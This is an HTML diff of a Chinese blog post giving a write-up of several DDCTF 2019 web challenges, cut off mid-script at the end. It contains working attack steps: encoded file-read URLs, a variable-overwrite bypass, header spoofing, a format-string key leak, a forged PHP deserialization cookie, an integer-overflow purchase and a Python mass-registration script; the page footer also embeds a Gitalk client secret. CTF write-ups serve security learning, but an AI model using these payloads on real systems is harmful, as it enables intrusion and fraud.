@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>DDCTF 部分题目 Writeup | Threezh1&#39;s blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Writeup,">
+  
+
+  <meta name="description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 部分题目 Writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/19/DDCTF 部分Writeup/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg">
+<meta property="og:updated_time" content="2019-05-17T02:49:04.253Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF 部分题目 Writeup">
+<meta name="twitter:description" content="这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。 Web - 滴~地址：http://117.51.150.246/ BASE64解码两次jpg参数的值：666C61672E6A7067 再经过一次16进制转字符串：flag.jpg 可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。 尝试读取index.php: http://117.51.150.2">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_blank">
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-滴"><span class="toc-text">Web - 滴~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-WEB签到题"><span class="toc-text">Web - WEB签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Upload-IMG"><span class="toc-text">Web - Upload-IMG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-复现-大吉大利-今晚吃鸡"><span class="toc-text">Web - 复现 - 大吉大利,今晚吃鸡~</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-DDCTF 部分Writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">DDCTF 部分题目 Writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.04.19</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Threezh1</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p><em>这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。</em></p>
+<h2 id="Web-滴"><a href="#Web-滴" class="headerlink" title="Web - 滴~"></a>Web - 滴~</h2><p>地址：<a href="http://117.51.150.246/" target="_blank" rel="noopener">http://117.51.150.246/</a></p>
+<p>BASE64解码两次jpg参数的值：666C61672E6A7067</p>
+<p>再经过一次16进制转字符串：flag.jpg</p>
+<p>可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。</p>
+<p>尝试读取index.php:</p>
+<p><code>http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
+<p>页面返回得到data协议里的经过BASE64处理后的数据，解码后得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里可以看到，$file经过的处理步骤为：</p>
+<ol>
+<li>jpg参数的值经过两次base64加密，一次进制转换。</li>
+<li>使用preg_replace()函数将除了字母数字外的字符删除</li>
+<li>将变量中<code>config</code>替换为<code>!</code></li>
+</ol>
+<p>题目中还给了提示<code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p>
+<p>看了之后我一直以为是要绕过preg_replace()提交一个<code>\b</code>来构造参数值来读取config.php，无果。</p>
+<p>后来经过别人提示才知道，博客的博主的另外一篇帖子提到的<a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">vim 异常退出 swp文件提示</a></p>
+<p>读取practice.txt.swp:</p>
+<p><code>http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=</code></p>
+<p>获得了一个文件名：f1ag!ddctf.php 访问后发现没有东西，直接读这个文件的源码：</p>
+<p>emmm,发现<code>f1ag!ddctf.php</code>被过滤成<code>f1agddctf.php</code>，因为str_replace()会把config替换为!，所以就直接把读取的文件名设为<code>f1agconfigddctf.php</code>，成功读取到源码：</p>
+<p><code>http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>变量覆盖，判断变量uid和文件名为变量k的文件内容是否相同。</p>
+<p>一开始想着应该是弱类型，但后来发现不是。</p>
+<p>如果文件不存在的话，读取到的内容就为空，所以uid赋值为空，k为一个不存在的文件名，访问：</p>
+<p><code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=333</code></p>
+<p>得到Flag。</p>
+<p>(因为网站存在robots.txt，内容为<code>excuse me?</code>， 我尝试访问：<code>http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&amp;k=robots.txt</code> 不知道为什么不成功)</p>
+<h2 id="Web-WEB签到题"><a href="#Web-WEB签到题" class="headerlink" title="Web - WEB签到题"></a>Web - WEB签到题</h2><p>题目地址：<a href="http://117.51.158.44/" target="_blank" rel="noopener">http://117.51.158.44/</a></p>
+<p>网页提示：<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
+<p>发现，弹出<code>需要授权</code>，他提示该网站称：<code>restricted username</code></p>
+<p>尝试了几个弱口令，不行。</p>
+<p>在index.php页面的源码中发现了一个js：<code>http://117.51.158.44/js/index.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>给<code>http://117.51.158.44/app/Auth.php</code>发了一个POST请求，并且http头包含<code>didictf_username</code></p>
+<p>用Brupsuite包含<code>Didictf_Username: admin</code>像Auth.php提交一个POST请求,返回：</p>
+<p><code>{errMsg:success,data:您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php}</code></p>
+<p>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>得到两份PHP代码，看来是又要审计？</p>
+<p>将源码理了一下，之后搜索到了<a href="https://juejin.im/post/5aa1154d6fb9a028de4448d2" target="_blank" rel="noopener">Codeigniter 利用加密Key（密钥）的对象注入漏洞</a></p>
+<p>读完文章之后的思路就是：</p>
+<ol>
+<li>拿到eancrykey</li>
+<li>通过反序列化修改<code>$this-&gt;path</code></li>
+<li>读取flag</li>
+</ol>
+<p>源码中可以看到eancrykey是通过读取<code>../config/key.txt</code>得到的，后面存在一个判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用POST提交<code>nickname=123 %s</code>.(需要将添加cookie值)</p>
+<p>因为这里$data变量经过了两次sprintf处理，只有在值里面添加s%，才能把eancrykey读出来。</p>
+<p>eancrykey的值为：<code>EzblrbNS</code>, 当时的截图：</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="eancrykey"></p>
+<p>根据文章里面的方法，构造反序列化的payload，源码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;path = <span class="string">"....//config/flag.txt"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session = serialize(<span class="keyword">new</span> Application);</span><br><span class="line"><span class="keyword">echo</span> $session;</span><br><span class="line"></span><br><span class="line">$private_key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($private_key.$session);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>生成的payload为：<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525</code> (记得将payload url编码)</p>
+<p>flag的地址是因为源码中的提示：<code>eancrykey  and flag under the folder</code>, 又因为$path会经过处理，会将”../“删除，所以双写”../“。最后发现path的长度刚刚18。</p>
+<p>将cookie值改为payload，就可以读取到flag。</p>
+<h2 id="Web-Upload-IMG"><a href="#Web-Upload-IMG" class="headerlink" title="Web - Upload-IMG"></a>Web - Upload-IMG</h2><p>这里考了一个没有接触过的点，二次渲染。</p>
+<p>这里上传的是一个JPG文件，先把jpg上传然后保存下来。</p>
+<p>使用脚本直接跑一下JPG图片，再次上传得到Flag。</p>
+<p>脚本来自：<a href="https://paper.tuisec.win/detail/39553671bf72998" target="_blank" rel="noopener">https://paper.tuisec.win/detail/39553671bf72998</a></p>
+<p>生成payload_jpg:</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="xuanran"></p>
+<p>得到Flag：</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg" alt="xuanran"></p>
+<h2 id="Web-复现-大吉大利-今晚吃鸡"><a href="#Web-复现-大吉大利-今晚吃鸡" class="headerlink" title="Web - 复现 - 大吉大利,今晚吃鸡~"></a>Web - 复现 - 大吉大利,今晚吃鸡~</h2><p>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</p>
+<p>发现只有100元，但买票需要2000元。</p>
+<p>我当时尝试过修改价钱，没绕过去，看了wp之后才知道是用整数溢出来绕过。</p>
+<p>购买链接为：<code>/ctf/api/buy_ticket?ticket_price=2000</code></p>
+<p>将ticket_price修改为：4294967297 (在32位系统下，所有无符号整数的数量是2^32=4294967296)</p>
+<p>提交，然后支付，购买成功并且只花了一元钱。</p>
+<p>在游戏里面提示：通过提交正确id与ticket来移除对手</p>
+<p>这里需要写一个脚本，批量注册，购买入场票，获得ID和ticket。然后用这个账户来移除。</p>
+<p>这里借用一个大佬的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">X = requests.Session()</span><br><span class="line">X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=admintest4&amp;password=admintest"</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">    R = requests.Session()</span><br><span class="line">    <span class="comment"># reg</span></span><br><span class="line">    reg_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=Sndav0&#123;&#125;&amp;password=12345678"</span>.format(i))</span><br><span class="line">    <span class="comment"># if "200" in reg_res.text:</span></span><br><span class="line">    <span class="comment">#     # print("Sndav&#123;&#125; is registed pass:12345678".format(i));</span></span><br><span class="line">    buy_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299"</span>)    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bill_id = json.loads(buy_res.text)</span><br><span class="line">        bill_id = bill_id[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">        <span class="comment"># print("billid:"+bill_id);</span></span><br><span class="line">        buy2_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;"</span>.format(bill_id))</span><br><span class="line">        <span class="comment"># print(json.loads(buy2_res.text)[u'code'])</span></span><br><span class="line">        <span class="comment"># get_token</span></span><br><span class="line">        token_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span>)</span><br><span class="line">        js = json.loads(token_res.text)[<span class="string">'data'</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(js)</span></span><br><span class="line">        id = js[<span class="string">'id'</span>]</span><br><span class="line">        ticket = js[<span class="string">'ticket'</span>]</span><br><span class="line">        print(id,ticket)</span><br><span class="line">        X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;"</span>.format(id,ticket))</span><br><span class="line">        print(X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).text)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>直接跑，返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">141 c8f034432be513ace9e8452f8af78d89</span><br><span class="line">&#123;&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;&quot;],&quot;msg&quot;:&quot;\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>这题的收获应该是了解了整数溢出，后面也可以总结一下。</p>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul>
+        
+          <li class="item">
+            
+              <span>微信扫一扫</span>
+            
+            <img src="/images/qr-wechat.png" alt>
+          </li>
+        
+          <li class="item">
+            
+              <span>支付宝扫一扫</span>
+            
+            <img src="/images/qr-alipay.png" alt>
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/04/16/Upload-labs-Writeup/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_blank">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+<!-- Gitalk评论插件通用代码 -->
+<div id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+const gitalk = new Gitalk({
+  clientID: '277317290454635afa73',
+  clientSecret: '78223c859304da5e8d71bfce136d436c6ff95c37',
+  repo: 'blog-comment',
+  owner: 'forsigner',
+  // 在这里设置一下截取前50个字符串, 这是因为 github 对 label 的长度有了要求, 如果超过
+  // 50个字符串则会报错.
+  // id: location.pathname.split('/').pop().substring(0, 49),
+  id: location.pathname,
+  admin: ['forsigner'],
+  // facebook-like distraction free mode
+  distractionFreeMode: false
+})
+gitalk.render('gitalk-container')
+</script>
+<!-- Gitalk代码结束 -->
+
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
